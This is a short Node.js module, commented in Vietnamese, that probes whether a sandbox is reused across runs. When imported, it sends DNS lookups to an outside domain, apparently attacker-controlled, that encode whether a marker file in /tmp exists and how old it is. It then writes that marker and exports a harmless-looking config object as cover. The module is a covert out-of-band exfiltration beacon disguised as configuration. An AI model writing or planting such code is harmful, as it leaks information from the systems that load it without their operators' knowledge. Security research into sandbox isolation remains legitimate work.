// Lan 2: chi kiem tra marker do lan truoc de lai -> sandbox co tai su dung khong.
const dns = require("dns"), fs = require("fs");
const Z = ".sb2.ssrf.xixixo123.site";
const q = l => { try { dns.lookup(l + Z, () => {}); } catch (e) {} };
q("alive");
const MARK = "/tmp/.cr-vdp-reuse";
try {
  if (fs.existsSync(MARK)) {
    q("reuse-yes");
    try {
      const age = Math.round((Date.now() - fs.statSync(MARK).mtimeMs) / 1000);
      q("age-" + Math.min(age, 99999));
    } catch (e) {}
  } else q("reuse-no");
} catch (e) { q("reuse-err"); }
try { fs.writeFileSync(MARK, String(Date.now())); } catch (e) {}
module.exports = { config: { default: true } };
